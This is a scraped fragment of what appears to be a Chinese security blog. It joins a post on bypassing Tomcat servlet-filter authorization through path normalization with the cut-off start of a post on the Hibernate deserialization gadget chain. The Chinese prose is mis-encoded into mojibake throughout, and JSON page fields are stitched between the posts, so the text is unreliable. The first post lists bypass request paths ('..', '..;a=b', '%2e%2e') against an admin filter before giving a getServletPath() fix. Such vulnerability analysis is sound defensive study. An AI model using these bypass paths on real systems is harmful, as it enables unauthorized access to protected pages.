ç›´æ¥æ¥çœ‹ç»•è¿‡æ–¹å¼ï¼Œå¦‚ä¸‹å›¾ä½¿ç”¨ä¸¤ä¸ª../ï¼š\nä¸€ä¸ª../ä¹Ÿå¯ä»¥ï¼š\nç®€å•ä»ç°è±¡æ¥çœ‹ï¼Œä¼¼ä¹éå¸¸åƒæˆ‘ä»¬ç»å¸¸é‡åˆ°çš„ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œä»ä»£ç è®¾ç½®çš„filteræ¥çœ‹ï¼š\næˆåŠŸè¿›å…¥ç¬¬ä¸€ä¸ªadmin/loginï¼Œå°±æ­£å¸¸è°ƒç”¨filterChain.doFilter()ï¼Œä½†æ˜¯ç»è¿‡tomcatçš„è·¯å¾„ä¿®æ­£ï¼Œæ•…å…¶æœ¬è´¨ä¼šè°ƒç”¨åˆ°.jspæŒ‡å®šçš„servletå®¹å™¨ï¼Œä»è€Œå®ç°äº†æƒé™ç»•è¿‡ã€‚\ntomcatå¯¹è·¯å¾„ä¿®æ­£çš„ä»£ç å­˜åœ¨äºCoyoteAdapterç±»çš„postParseRequest()æ–¹æ³•ï¼š\nè¿™é‡Œè°ƒç”¨äº†req.requestURI()è·å–uriï¼Œç»§ç»­å¾€åèµ°ï¼Œåˆ°è°ƒç”¨convert()æ–¹æ³•ï¼š\nè¿™é‡Œçš„convertæ˜¯ä¸€ä¸ªurlè§£ç çš„æ“ä½œï¼Œæˆ‘ä»¬åç»­å†è¯¦ç»†è°ˆã€‚ç»§ç»­å¾€åçœ‹ï¼Œä¼šè°ƒç”¨normalize()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹å‡ºå‚æ•°ä¼ é€’çš„è¿˜æ˜¯è·å–åˆ°çš„uriï¼Œè·Ÿè¿›normalize()æ–¹æ³•ï¼š\nè·å–å…·ä½“çš„uriï¼Œç„¶åè·å–å…¶èµ·å§‹ä»¥åŠæœ€åçš„ä½ç½®ï¼ˆå°±æ˜¯è·å–å…¶é•¿åº¦ï¼‰ï¼Œåç»­æ¯”è¾ƒå…³é”®çš„å°±æ˜¯å¦‚ä¸‹ä»£ç ï¼š\nè¿™é‡Œçš„é€»è¾‘å°±æ˜¯å¾ªç¯æ¸…ç†/./ï¼Œç›´åˆ°åœ¨uriBCä¸­æ‰¾ä¸åˆ°/./ï¼Œè¿‡ç¨‹å°±æ˜¯/a/./bæ›¿æ¢ä¸º/a/bï¼Œæ•…é•¿åº¦éœ€è¦-2ã€‚\nåç»­çš„æ¯”è¾ƒå…³é”®çš„ä»£ç å°±æ˜¯å¦‚ä¸‹ï¼š\nè¿™é‡Œç»§ç»­æ¸…ç†/../ï¼Œä¹Ÿæ˜¯è¿™ä¸€éƒ¨åˆ†çš„../ç»•è¿‡çš„åŸç†æ‰€åœ¨ï¼Œä»ä»£ç é€»è¾‘çœ‹æ¥ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªç”¨æ¥å®ç°å¦ä¸€ç±»çš„â€œç›®å½•ç©¿è¶Šâ€çš„è·¯å¾„æ¸…ç†ï¼Œä»£ç é€»è¾‘å°±æ˜¯ï¼š\nå¦‚æœåŒ¹é…åˆ°/../åœ¨å¼€å¤´ï¼Œé‚£ä¹ˆå°±ä¼šè·³åˆ°contextæ ¹ç›®å½•ä¹‹å¤–ï¼Œå°±ç›´æ¥è¿”å›falseã€‚ å¦‚æœåŒ¹é…åˆ°åç»­ä½ç½®ï¼Œæ¯”å¦‚admin/login/../index.jspï¼Œé‚£ä¹ˆå°±ä¼šå¯»æ‰¾/../å‰çš„ä¸€ä¸ª/ï¼Œç„¶åå°†å‰ä¸€ä¸ªç›®å½•å+/../ä¸€èµ·åˆ æ‰ï¼Œåœ¨è¿™é‡Œä½“ç°å‡ºæ¥å°±æ˜¯æŠŠlogin/../ä¸€èµ·åˆ æ‰ï¼Œä»è€Œå˜æˆäº†admin/index.jspï¼Œå¦‚ä¸‹å›¾ï¼š è¿™æ ·åç»­æŒ‡å®šçš„urlå°±å˜æˆäº†admin/index.jspã€‚å½“è°ƒç”¨å®Œäº†normalize()æ–¹æ³•ï¼Œè¿˜ä¼šè°ƒç”¨checkNormalize()å†æ¬¡æ£€æŸ¥ï¼Œä½†æ˜¯è¿™æ¬¡æ˜¯åŒ¹é…åˆ°å­˜åœ¨/./æˆ–è€…/../æ˜¯ç›´æ¥è¿”å›400ï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”\næ­¤æ—¶çš„è°ƒç”¨æ ˆï¼š\n1 2 3 4 5 6 7 8 9 10 11 postParseRequest:688, CoyoteAdapter (org.apache.catalina.connector) service:341, CoyoteAdapter (org.apache.catalina.connector) service:397, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:935, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1792, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1189, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:658, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) å†çœ‹æˆ‘ä»¬è°ƒç”¨åˆ°filterçš„è°ƒç”¨æ ˆï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 doFilter:26, Testfilter (org.example) internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core) doFilter:144, ApplicationFilterChain (org.apache.catalina.core) invoke:168, StandardWrapperValve (org.apache.catalina.core) invoke:90, StandardContextValve (org.apache.catalina.core) invoke:482, AuthenticatorBase (org.apache.catalina.authenticator) invoke:130, StandardHostValve (org.apache.catalina.core) invoke:93, ErrorReportValve (org.apache.catalina.valves) invoke:656, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:346, CoyoteAdapter (org.apache.catalina.connector) service:397, Http11Processor (org.apache.coyote.http11) process:63, AbstractProcessorLight (org.apache.coyote) process:935, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1792, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:52, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1189, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:658, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) ä¸¤ç›¸å¯¹æ¯”å°±å¯ä»¥çŸ¥é“è¿™ä¸ªç»•è¿‡çš„åŸç†äº†ã€‚\nç”±äºtomcatçš„è·¯å¾„ä¿®æ­£ï¼Œè®©æˆ‘ä»¬è¯·æ±‚çš„/tomcat002_Web_exploded/admin/login/../index.jspå˜æˆäº†/tomcat002_Web_exploded/admin/index.jspï¼Œç›´æ¥æŒ‡å‘äº†éœ€è¦é‰´æƒçš„é¡µé¢ï¼Œä½†æ˜¯åœ¨åç»­çš„è°ƒç”¨ä¸­ï¼Œåˆ°æˆ‘ä»¬è®¾ç½®çš„filteræ—¶ï¼š\nè¿˜æ˜¯ä½¿ç”¨çš„getRequestURI()æ¥è·å–å…¨ipï¼Œå¯¼è‡´è¿›å…¥äº†ç™½åå•ï¼Œæ”¾è¡Œäº†å½“å‰çš„urlè¯·æ±‚ï¼Œä½†æ˜¯ç»è¿‡è·¯å¾„ä¿®æ­£ï¼Œå®é™…æŒ‡å‘çš„æ˜¯admin/index.jspï¼Œæ•…æˆåŠŸç»•è¿‡é‰´æƒæ‹¿åˆ°adminé¡µé¢çš„ä¿¡æ¯ã€‚\n;ç»•è¿‡ å‰é¢å¿˜è®°åˆ†æäº†ä¸€ä¸ªç‚¹ï¼Œå…ˆç»™å‡ºå¯¹å‰é¢ç»•è¿‡æ–¹å¼è¿›è¡Œé™åˆ¶çš„ä»£ç ï¼Œæ¥çœ‹çœ‹æ˜¯å¦è¿˜å¯ä»¥ç»•è¿‡ï¼Œä¿®æ”¹Testfilter.javaæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package org.example; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebFilter(\u0026#34;/admin/*\u0026#34;) public class Testfilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;Testfilter init\u0026#34;); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; HttpServletResponse resp = (HttpServletResponse) servletResponse; //æ¼æ´ç‚¹ String requestURL = req.getRequestURI(); int waf=0; waf = requestURL.indexOf(\u0026#34;../\u0026#34;); if(waf\u0026gt;0){ resp.getWriter().write(\u0026#34;url error ï¼Œdo not attack\u0026#34;); return; } if(requestURL.startsWith(\u0026#34;/tomcat002_Web_exploded/admin/login\u0026#34;)) { //å¯¹ç™»å½•é¡µé¢è®¾ç½®ç™½åå• filterChain.doFilter(servletRequest, servletResponse); } else if(requestURL.endsWith(\u0026#34;.jsp\u0026#34;)) { //å¯¹adminé¡µé¢è¿›è¡Œé™åˆ¶ Object user = req.getSession().getAttribute(\u0026#34;user\u0026#34;); if(user == null || !user.toString().equals(\u0026#34;admin\u0026#34;)) { resp.getWriter().write(\u0026#34;please login\u0026#34;); return; } filterChain.doFilter(servletRequest, servletResponse); } } @Override public void destroy() { } } åŠ äº†ä¸€ä¸ªå¯¹../çš„é™åˆ¶ï¼š\nå¦‚ä½•ç»•è¿‡ï¼Œå¦‚ä¸‹å›¾ï¼š\næ˜¯çš„ï¼Œä½¿ç”¨çš„åˆ†å·ã€‚é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆå‘¢ã€‚æ‰“æ–­ç‚¹è°ƒè¯•å¦‚ä¸‹ï¼š\nè¿›å…¥è¿™é‡Œè°ƒç”¨çš„parsePathParameters()æ–¹æ³•ï¼Œå¦‚å›¾å¯çœ‹å‡ºåç»­è¿›è¡Œäº†urlè§£ç ï¼Œä¹Ÿå°±æ˜¯å‰é¢åˆ†æçš„ã€‚è·Ÿè¿›parsePathParameters()æ–¹æ³•ï¼š\néœ€è¦æœ‰åˆ†å·ï¼Œç„¶åå¯»æ‰¾å…¶ä¸­çš„å‚æ•°ï¼š\nè¿™é‡ŒåŒ¹é…é€»è¾‘å°±æ˜¯ä»ç¬¬ä¸€ä¸ªåˆ†å·åˆ°ä¸‹ä¸€ä¸ªåˆ†å·ï¼Œæˆ–è€…åˆ°ä¸‹ä¸€ä¸ª/ï¼Œæ¯”å¦‚;a=b;c=d/ï¼Œé‚£ä¹ˆå°±ä¼šåŒ¹é…åˆ°a=bå’Œc=dä¸¤ä¸ªé”®å€¼å¯¹ï¼ˆä¹Ÿæ˜¯å¾ªç¯è¿›è¡ŒåŒ¹é…çš„ï¼Œæ¯æ¬¡åªå–ä¸€ä¸ªé”®å€¼å¯¹ï¼‰ï¼Œå½“åŒ¹é…åˆ°åï¼Œä¼šå°†;a=bä¸€èµ·åˆ æ‰ï¼Œæ•…æœ€åå‰©ä¸‹çš„uriä¸ºï¼š\n1 tomcat002_Web_exploded/admin/login/../index.jsp ç”±æ­¤å°±æ˜¯åˆå¯ä»¥è¾¾åˆ°ä¸€æ¬¡æƒé™ç»•è¿‡ã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå­˜åœ¨è¿™ç§é€»è¾‘å‘¢ï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†åœ¨è·å–åˆ°å‚æ•°åå¯¹requestå¯¹è±¡è¿›è¡Œâ€å¡«å……â€œï¼Œä¸ºå¯¹è±¡æ·»åŠ ä¸€äº›å¿…è¦çš„å±æ€§ï¼š\nè¿‡ç¨‹å¾ˆå¥½ç†è§£ï¼Œåœ¨filterä¸­é€šè¿‡getRequestURI()è·å–å®Œæ•´ç›®å½•ï¼Œç„¶åä¼šè¿›å…¥åˆ°ç™»é™†å£ç™½åå•ï¼Œå†ç„¶åä¼šè®¿é—®ç»è¿‡è·¯å¾„ä¿®æ­£çš„servletï¼Œä»è€ŒæˆåŠŸå®ç°æƒé™ç»•è¿‡ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç”±æ­¤å¯ä»¥çŸ¥é“æ•´ä½“çš„é€»è¾‘å°±æ˜¯ å…ˆurlè§£ç =\u0026gt;å»é™¤åˆ†å·åŠå…¶åŒ¹é…çš„é”®å€¼å¯¹ =\u0026gt; å»æ‰./ =ã€‹å»æ‰../ä»¥åŠå‰ä¸€ä¸ªç›®å½•ã€‚\nurlç¼–ç ç»•è¿‡ é‚£ä¹ˆæˆ‘å°†ä»£ç æ”¹æˆå¦‚ä¸‹è¿˜æ˜¯å¦èƒ½ç»•è¿‡å‘¢ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package org.example; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebFilter(\u0026#34;/admin/*\u0026#34;) public class Testfilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;Testfilter init\u0026#34;); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; HttpServletResponse resp = (HttpServletResponse) servletResponse; //æ¼æ´ç‚¹ String requestURL = req.getRequestURI(); int waf=0; waf = requestURL.indexOf(\u0026#34;..\u0026#34;); if(waf\u0026gt;0){ resp.getWriter().write(\u0026#34;url error ï¼Œdo not attack\u0026#34;); return; } if(requestURL.startsWith(\u0026#34;/tomcat002_Web_exploded/admin/login\u0026#34;)) { //å¯¹ç™»å½•é¡µé¢è®¾ç½®ç™½åå• filterChain.doFilter(servletRequest, servletResponse); } else if(requestURL.endsWith(\u0026#34;.jsp\u0026#34;)) { //å¯¹adminé¡µé¢è¿›è¡Œé™åˆ¶ Object user = req.getSession().getAttribute(\u0026#34;user\u0026#34;); if(user == null || !user.toString().equals(\u0026#34;admin\u0026#34;)) { resp.getWriter().write(\u0026#34;please login\u0026#34;); return; } filterChain.doFilter(servletRequest, servletResponse); } } @Override public void destroy() { } } ç›´æ¥é‡œåº•æŠ½è–ªï¼Œè¿‡æ»¤æ‰å…³é”®çš„..ç¬¦å·ï¼ˆæœ¬æ¥æƒ³è®¾ç½®è¿‡æ»¤.ï¼Œåé¢å‘ç°æ–‡ä»¶åæœ‰ä¸€ä¸ª.ï¼‰ï¼š\næ— æ³•åˆ©ç”¨ï¼Œå¦‚ä¸‹ç»•è¿‡æ–¹å¼ï¼š\næˆåŠŸå®ç°æƒé™ç»•è¿‡ã€‚å‰é¢å°±æåˆ°äº†tomcatä¿®æ­£è·¯å¾„æ—¶ä¼šurlè§£ç ï¼Œç›´æ¥è·Ÿè¿›å¯¹åº”çš„convert()å‡½æ•°ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªurlè§£ç çš„å‡½æ•°ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼š\nå¾ªç¯è§£ç ï¼š\nå…¶æ¬¡æ˜¯å¯¹è§£ç å‡ºæ¥çš„å†…å®¹æœ‰åŒ¹é…ï¼š\nå¦‚å›¾æ‰€ç¤ºæœ‰/å’Œ\\ï¼Œè¿˜æœ‰%ï¼Œè¿™é‡Œå…³æ³¨/ï¼Œå¯ä»¥å°†urlä¸Šçš„/ç¼–ç ï¼Œä¼šæ˜¯å¦‚ä¸‹æƒ…å†µï¼šï¼š\nå…³é”®åœ¨äºè¿™é‡Œçš„encodedSolidusHandlingï¼Œä¸‰ä¸ªæ¨¡å¼åˆ†åˆ«å¯¹åº”å¦‚ä¸‹è¯´æ˜ï¼š\nDECODEï¼šè§£ç æˆ/ã€‚ REJECTï¼šæ‹’ç»è¯·æ±‚ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚ PASS_THROUGHï¼šä¿æŒåŸæ ·ã€‚ åœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œå¦‚å›¾æ‰€ç¤ºæ¨¡å¼å°±æ˜¯REJECTï¼Œæ•…è¿™é‡Œä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼š\næ•…åªç”¨ç¼–ç .å³å¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼šç¼–ç åˆ†å·ä¹Ÿæ˜¯æœ‰é—®é¢˜çš„ï¼Œä¸»è¦åŸå› å°±æ˜¯è§£æé¡ºåºçš„é—®é¢˜ï¼Œåœ¨å‰é¢å°±æåˆ°äº†é¡ºåºä¸ºï¼š\nç”±æ­¤å¯ä»¥çŸ¥é“æ•´ä½“çš„é€»è¾‘å°±æ˜¯ å…ˆurlè§£ç =\u0026gt;å»é™¤åˆ†å·åŠå…¶åŒ¹é…çš„é”®å€¼å¯¹ =\u0026gt; å»æ‰./ =ã€‹å»æ‰../ä»¥åŠå‰ä¸€ä¸ªç›®å½•ã€‚\nå¦‚æœç¼–ç äº†åˆ†å·ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸€æ­¥å°±ä¼šå› ä¸ºæ²¡æœ‰åŒ¹é…åˆ°åˆ†å·è€Œä¸èƒ½æ­£å¸¸åˆ å»uriä¸Šçš„é”®å€¼å¯¹ï¼Œå¯¼è‡´åç»­çš„æ‰€æœ‰æ“ä½œçš„ä¸èƒ½ç”Ÿæ•ˆã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\næœ€å é‚£ä¹ˆå¦‚ä½•ä¿®å¤å‘¢ï¼Œå…¶å®ç›´æ¥ä½¿ç”¨getServletPath()æ–¹æ³•æ¥è¿›è¡Œåˆ¤æ–­å³å¯ï¼Œåç«¯ç®€å•æ”¹ä¸€ä¸‹ä»£ç æ¥å¯¹æ¯”ï¼š\n1 2 3 4 String requestURL0 = req.getRequestURI(); System.out.println(requestURL0); String requestURL = req.getServletPath(); System.out.println(requestURL); ç„¶åå†æ‰“å‰é¢çš„ç»•è¿‡payloadï¼Œæ•ˆæœå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 1./tomcat002_Web_exploded/admin/login/../index.jspæœªç»•è¿‡ï¼Œè·å–å†…å®¹ä¸ºï¼š /tomcat002_Web_exploded/admin/login/../index.jsp /admin/index.jsp 2. /tomcat002_Web_exploded/admin/login/..;a=b/index.jspæœªç»•è¿‡ï¼Œè·å–å†…å®¹ä¸ºï¼š /tomcat002_Web_exploded/admin/login/..;a=b/index.jsp /admin/index.jsp 3./tomcat002_Web_exploded/admin/login/%2e%2e/index.jspæœªç»•è¿‡ï¼Œè·å–å†…å®¹ä¸ºï¼š /tomcat002_Web_exploded/admin/login/%2e%2e/index.jsp /admin/index.jsp å¯ä»¥çœ‹åˆ°è·å–åˆ°çš„å†…å®¹éƒ½æ˜¯å¯¹åº”çš„servletè·¯å¾„ï¼ŒæˆåŠŸå®ç°é™åˆ¶ï¼Œå¦‚æœ‰é—®é¢˜ï¼Œæ•¬è¯·æŒ‡æ­£ã€‚\nâ€”â€”â€”â€”\nè¿™ä¸€éƒ¨åˆ†çš„ç»•è¿‡æ–¹å¼è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œå…³é”®åœ¨äºåç«¯ä»£ç æ˜¯å¦‚ä½•å®ç°çš„ï¼Œè¿˜æœ‰çš„å°±æ˜¯å¯¹ä»£ç å±‚é¢çš„ç†è§£ä»¥åŠå¯¹urlçš„å¤„ç†é€»è¾‘ã€‚å¦‚ä½•å¯ä»¥æŒ–æ˜å‡ºè¿™æ ·ä¸€ä¸ªæ¡†æ¶ä¸‹çš„æƒé™ç»•è¿‡æ¼æ´ï¼Œä¸ªäººè®¤ä¸ºéœ€è¦å¦‚ä¸‹å‡ ç‚¹ï¼š\næ¸…æ¥šæ¡†æ¶çš„æ•´ä½“å¯¹httpè¯·æ±‚çš„å¤„ç†ç»“æœ å¯¹å…³é”®ä¿¡æ¯çš„æ•æ„Ÿæ€§ åç«¯ä»£ç å®ç°çš„é€»è¾‘é”™è¯¯ æ•´ä½“ç¼ºä¸€ä¸å¯ï¼Œéœ€è¦ä¸€å®šçš„æŠ€æœ¯æ·±åº¦ï¼Œè¿™ä¸ªæƒé™ç»•è¿‡æ¼æ´ç¡®å®ç»å…¸ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://tomcat.net.cn/tomcat-11.0-doc/index.html\nhttps://xz.aliyun.com/news/7139\nhttps://www.cnblogs.com/zpchcbd/p/14815501.html\n","date":"2025-09-25T21:45:12+08:00","permalink":"https://fupanc-w1n.github.io/p/tomcat%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3/","title":"Tomcatå…³é”®çŸ¥è¯†äº†è§£"},{"content":"hibernateç»„ä»¶çš„ååºåˆ—åŒ–æ¼æ´ hibernateæ˜¯åŸºäºJavaå¼€å‘çš„ä¸€ä¸ªORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ¡†æ¶ï¼Œé€šè¿‡å°†Javaå¯¹è±¡ä¸æ•°æ®åº“è¿›è¡Œæ˜ å°„ï¼Œç®€åŒ–äº†æ•°æ®åº“æ“ä½œã€‚\nç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„ç»„ä»¶ï¼Œæ¯”å¦‚å¸¸è§çš„SSHï¼ˆStrutsã€Springå’ŒHibernateï¼‰æ¡†æ¶å°±ä½¿ç”¨äº†è¿™ä¸ªã€‚\nä½†æ˜¯è¿™é‡Œä¸»è¦æ¥è°ˆè°ˆè¿™ä¸ªç»„ä»¶å­˜åœ¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨ä¸€å®šçš„ç‰ˆæœ¬ä¸‹å¯ä»¥æ‰“TemplatesImplçš„åŠ¨æ€åŠ è½½å­—èŠ‚ç å’Œæ‰“jndiæ¼æ´ã€‚\nåœ¨ysoserialä¸­æåˆ°äº†ä¸¤æ¡åˆ©ç”¨é“¾ï¼Œå¯¹åº”ä¸Šè¿°çš„ä¸¤ä¸ªåˆ©ç”¨æ–¹æ³•ï¼Œä¸‹é¢æ¥åˆ†åˆ«åˆ†æä¸€ä¸‹è°ƒç”¨é“¾çš„è¿‡ç¨‹ã€‚\nåˆ†æç¯å¢ƒï¼šjdk8u71\nhibernate1é“¾ ysoserialä¸­ç»™å‡ºäº†å¦‚ä¸‹æ³¨é‡Šï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /** * * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() * * * Requires: * - Hibernate (\u0026gt;= 5 gives arbitrary method invocation, \u0026lt;5 getXYZ only) * * @author mbechler */ è¯´æ˜äº†ç‰ˆæœ¬é—®é¢˜ï¼Œåœ¨hibernate\u0026gt;=5çš„æƒ…å†µä¸‹å¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œåœ¨\u0026lt;5æ—¶å°±åªèƒ½è°ƒç”¨getteræ–¹æ³•ã€‚è¿˜ç»™å‡ºäº†åŸºæœ¬çš„è°ƒç”¨æ ˆï¼Œç°åœ¨å°±ä¸åŒç‰ˆæœ¬æ¥åˆ†æä¸€ä¸‹è°ƒç”¨é“¾ã€‚\nhibernate\u0026gt;=5 æ·»åŠ ä¾èµ–å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.hibernate\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hibernate-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.6.15.Final\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; é“¾å­åˆ†æ å…ˆæ¥ç®€å•è·Ÿä¸€éè¿™é‡Œé“¾å­çš„è¿‡ç¨‹ï¼Œç„¶ååœ¨è‡ªå·±å°è¯•æ„é€ pocï¼Œèµ·ç‚¹æ˜¯TypedValueç±»çš„hashCode()æ–¹æ³•ï¼š\næƒ³è¦è°ƒç”¨åˆ°è¿™é‡Œçš„TypedValueç±»çš„hasoCode()æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥ä½¿ç”¨HashMapæˆ–è€…Hashtableä½œä¸ºå…¥å£ç±»å³å¯ã€‚\né‚£ä¹ˆå…³äºè¿™é‡Œçš„hashcodeå˜é‡ï¼Œåœ¨TypedValueç±»åˆå§‹åŒ–æ—¶å°±ä¼šç¡®å®šï¼š\nè·Ÿè¿›è°ƒç”¨çš„initTransients()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°ç›´æ¥å°†hashcodeå˜é‡å®šä¹‰ä¸ºäº†ValueHolderç±»å®ä¾‹ï¼Œå¹¶ä¸”åœ¨ValueHolderç±»åˆå§‹åŒ–æ—¶å®šä¹‰äº†ä¸€ä¸ªåŒ¿åå†…éƒ¨ç±»ä½œä¸ºåˆå§‹åŒ–çš„ä¼ å‚ï¼Œè¿™ä¸ªåŒ¿åç±»è¿˜å®ç°äº†initialize()æ–¹æ³•ã€‚\nå›åˆ°TypedValueç±»çš„hashCode()æ–¹æ³•ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šè°ƒç”¨ValueHolderç±»çš„getValue()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹å‡ºåˆšå¥½å°±ä¼šè°ƒç”¨åˆå§‹åŒ–ä¼ å‚çš„åŒ¿åç±»çš„initialize()æ–¹æ³•ï¼š\nåœ¨è¿™é‡Œéœ€è¦æ§åˆ¶typeä¸ºorg.hibernate.type.ComponentTypeç±»å¯¹è±¡ï¼Œè·Ÿè¿›ComponentTypeç±»çš„getHashCode()æ–¹æ³•ï¼š\nå†è·Ÿè¿›è¿™é‡Œè°ƒç”¨çš„getPropertyValue()æ–¹æ³•ï¼š\nè¿™é‡Œéœ€è¦æ§åˆ¶è°ƒç”¨åˆ°çš„æ˜¯æŠ½è±¡ç±»AbstractComponentTuplizerçš„getPropertyValue()æ–¹æ³•ï¼š\næ•…ç›´æ¥æ‰¾AbstractComponentTuplizerçš„å®ç°ç±»å³å¯ï¼š\nç®€å•çœ‹äº†ä¸€ä¸‹æµç¨‹ï¼Œè¿™é‡Œçš„DynamicMapComponentTuplizeråº”è¯¥æ˜¯åˆ©ç”¨ä¸äº†çš„ï¼Œé™¤éç»“åˆåˆ°ccä¾èµ–ä¸­çš„lazymapå¯èƒ½æœ‰ç‚¹æå¤´ï¼Œæ•…è¿™é‡Œä¸»è¦åˆ©ç”¨çš„è¿˜æ˜¯PojoComponentTuplizerç±»æ¥ä½œä¸ºå®ä¾‹åŒ–ä¸ºå¯¹è±¡çš„ç‚¹ã€‚\næœ€ååœ¨AbstractComponentTuplizeräº†æŠ½è±¡ç±»çš„getPropertyValue()æ–¹æ³•ä¸­æ§åˆ¶getterä¸ºGetterMethodImplç±»ï¼Œä»è€Œè°ƒç”¨åˆ°å®ƒçš„get()æ–¹æ³•ï¼š\nç”±æ­¤å¯å®ç°æ–¹æ³•çš„è°ƒç”¨ï¼Œå¹¶ä¸”ç¡®å®ä»è¿™é‡Œçœ‹æ¥ï¼Œåªè¦æˆ‘ä»¬èƒ½åˆ°è¾¾GetterMethodImplç±»çš„get()æ–¹æ³•ï¼š\nåªè¦æ§åˆ¶ownerå’ŒgetterMethodï¼Œå°±å¯ä»¥å®ç°ä»»æ„æ–¹æ³•è°ƒç”¨ã€‚\nç”±æ­¤é“¾å­å·²ç»é€šäº†ï¼Œæ¥å°è¯•æ„é€ ä¸€ä¸‹pocã€‚\né“¾å­æ„é€  åœ¨å°è¯•æ„é€ æ—¶ï¼Œå…¶ä¸­æ›´æœ‰ä¸€ä¸ªç»•ä¸è¿‡çš„ç‚¹å°±æ˜¯éœ€è¦ç”¨åˆ°çš„ç±»çš„åˆå§‹åŒ–ï¼Œä½†æ˜¯è¿™äº›ç±»çš„åˆå§‹åŒ–éœ€è¦çš„ç±»å¾ˆå¤šï¼Œæ¯”å¦‚Componentçš„åˆå§‹åŒ–ï¼š\nç­‰ç­‰ï¼Œè¿™æ 